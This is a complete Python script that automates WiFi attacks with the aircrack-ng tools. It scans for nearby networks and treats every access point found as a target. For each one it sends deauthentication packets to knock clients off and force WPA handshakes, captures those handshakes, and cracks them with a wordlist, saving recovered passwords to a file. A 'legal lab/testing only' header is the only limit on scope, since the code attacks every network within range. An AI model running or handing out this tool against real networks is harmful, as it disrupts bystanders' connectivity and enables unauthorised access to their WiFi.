#!/usr/bin/env python3
# auto_aircrack_lab.py
# Automated WiFi handshake capture & crack script for legal lab/testing only.
# Usage: sudo ./auto_aircrack_lab.py wlan0

import os, sys, subprocess, time, re, signal, csv, shutil
from datetime import datetime
from pathlib import Path
from scapy.all import rdpcap, EAPOL   # for EAPOL detection

# ---------------- CONFIG ----------------
IFACE = sys.argv[1] if len(sys.argv) > 1 else "wlan0"
SCAN_DURATION = 30          # seconds for scan
DEAUTH_PACKETS = 5          # number of deauth packets
CAPTURE_WAIT = 15           # wait after deauth
OUTPUT_DIR = Path("./wifi_results")
KILL_NETWORK_MANAGER = True # stop NetworkManager during test
WORDLIST = "/usr/share/wordlists/wifite.txt"
CRACK_RESULTS_FILE = OUTPUT_DIR / "cracked_wifi.txt"
REQ_TOOLS = ["airmon-ng","airodump-ng","aireplay-ng","aircrack-ng","timeout"]
# ----------------------------------------

SESSION_DIR = OUTPUT_DIR / f"session-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
SESSION_DIR.mkdir(parents=True, exist_ok=True)

def run(cmd, check=True, background=False, **kwargs):
    """Run a command safely."""
    if background:
        return subprocess.Popen(cmd, preexec_fn=os.setsid, **kwargs)
    else:
        return subprocess.run(cmd, check=check, **kwargs)

def check_tools():
    for t in REQ_TOOLS:
        if not shutil.which(t):
            print(f"ERROR: Required tool {t} not found. Install aircrack-ng etc.")
            sys.exit(2)

def cleanup(mon_iface):
    print("[*] Cleaning up...")
    subprocess.run(["pkill","-f",f"airodump-ng .*{mon_iface}"], stderr=subprocess.DEVNULL)
    if mon_iface:
        subprocess.run(["airmon-ng","stop",mon_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if KILL_NETWORK_MANAGER:
        print("[*] Restart NetworkManager with: sudo systemctl start NetworkManager")

def ensure_root():
    if os.geteuid() != 0:
        print("ERROR: Run as root (sudo).")
        sys.exit(1)

def start_monitor(iface):
    print(f"[*] Starting monitor mode on {iface}...")
    subprocess.run(["airmon-ng","start",iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    mon = iface+"mon"
    if not Path(f"/sys/class/net/{mon}").exists():
        # fallback: find any mon interface
        data = subprocess.check_output(["ip","-brief","link"]).decode()
        for line in data.splitlines():
            if "mon" in line: return line.split()[0]
    return mon

def scan_networks(mon_iface):
    prefix = SESSION_DIR / "scan"
    csv_file = f"{prefix}-01.csv"
    print(f"[*] Scanning for {SCAN_DURATION}s ...")
    proc = run(
        ["airodump-ng","--write",str(prefix),"--output-format","csv",mon_iface],
        background=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(SCAN_DURATION)
    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    time.sleep(2)
    if not Path(csv_file).exists():
        files = list(SESSION_DIR.glob("scan*.csv"))
        if files: csv_file = str(files[0])
    if not Path(csv_file).exists():
        print("ERROR: No scan CSV created.")
        sys.exit(3)
    return csv_file

def parse_targets(csv_file):
    targets = []
    with open(csv_file,newline="") as f:
        reader = csv.reader(f)
        for row in reader:
            if len(row) > 13 and re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", row[0].strip()):
                bssid = row[0].strip()
                chan = row[3].strip()
                essid = row[13].strip()
                if bssid and chan:
                    targets.append((bssid,chan,essid))
    return targets

def check_eapol_in_cap(cap_file):
    try:
        packets = rdpcap(cap_file)
        eapol_pkts = [pkt for pkt in packets if pkt.haslayer(EAPOL)]
        return len(eapol_pkts) > 0
    except Exception as e:
        print(f"[!] Error parsing {cap_file}: {e}")
        return False

def capture_handshake(mon_iface, bssid, chan, essid):
    safe_name = re.sub(r"[^A-Za-z0-9._-]","_",f"{essid}_{bssid}")
    cap_prefix = SESSION_DIR / f"capture_{safe_name}"
    cap_file = f"{cap_prefix}-01.cap"
    print("\n===================================")
    print(f"[*] Target: ESSID='{essid}'  BSSID={bssid}  CH={chan}")
    print("===================================")
    proc = run(
        ["airodump-ng","-c",chan,"--bssid",bssid,"-w",str(cap_prefix),mon_iface],
        background=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(2)
    print(f"[*] Sending {DEAUTH_PACKETS} deauths...")
    run(["aireplay-ng","-0",str(DEAUTH_PACKETS),"-a",bssid,mon_iface],
        check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"[*] Waiting {CAPTURE_WAIT}s...")
    time.sleep(CAPTURE_WAIT)
    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    time.sleep(1)
    if Path(cap_file).exists():
        out = subprocess.check_output(["aircrack-ng",cap_file]).decode(errors="ignore")
        if "handshake" in out.lower():
            print(f"[+] Handshake captured for {bssid} ({essid})")
            has_eapol = check_eapol_in_cap(cap_file)
            if has_eapol:
                hs_dir = SESSION_DIR / "handshakes_eapol"
                hs_dir.mkdir(exist_ok=True)
                os.rename(cap_file, hs_dir / f"{safe_name}.cap")
                print(f"[+] EAPOL found → saved to {hs_dir}/{safe_name}.cap")
            else:
                hs_dir = SESSION_DIR / "handshakes_noeapol"
                hs_dir.mkdir(exist_ok=True)
                os.rename(cap_file, hs_dir / f"{safe_name}.cap")
                print(f"[-] No EAPOL in capture → saved to {hs_dir}/{safe_name}.cap")
        else:
            print("[-] No handshake detected")
    else:
        print("[-] No capture file")

def crack_handshakes():
    hs_dir = SESSION_DIR / "handshakes_eapol"
    if not hs_dir.exists():
        print("[-] No EAPOL handshakes to crack.")
        return
    print("[*] Starting cracking process...")
    with open(CRACK_RESULTS_FILE, "a") as out_file:
        for cap_file in hs_dir.glob("*.cap"):
            print(f"[*] Cracking {cap_file} ...")
            result = subprocess.run(
                ["aircrack-ng", "-w", WORDLIST, str(cap_file)],
                capture_output=True, text=True
            )
            password = None
            essid, bssid = None, None
            for line in result.stdout.splitlines():
                if "KEY FOUND!" in line:
                    password = line.split("!")[1].split(":")[1].strip()
                if "BSSID" in line:
                    match = re.search(r"([0-9A-F:]{17})", line)
                    if match:
                        bssid = match.group(1)
                if "ESSID" in line and ":" in line:
                    essid = line.split(":",1)[1].strip()

            if password:
                print(f"[+] Cracked {essid} ({bssid}): {password}")
                out_file.write(f"{essid},{bssid},{password}\n")
            else:
                print(f"[-] Could not crack {cap_file.name}")
    print(f"[*] Cracking finished. Results saved to {CRACK_RESULTS_FILE}")

def main():
    ensure_root()
    check_tools()
    mon_iface = start_monitor(IFACE)
    try:
        csv_file = scan_networks(mon_iface)
        targets = parse_targets(csv_file)
        if not targets:
            print("[-] No networks found")
            return
        for bssid,chan,essid in targets:
            capture_handshake(mon_iface,bssid,chan,essid)
        crack_handshakes()
    finally:
        cleanup(mon_iface)
        print("[*] Done. Handshakes & cracked results in session folder.")

if __name__=="__main__":
    main()
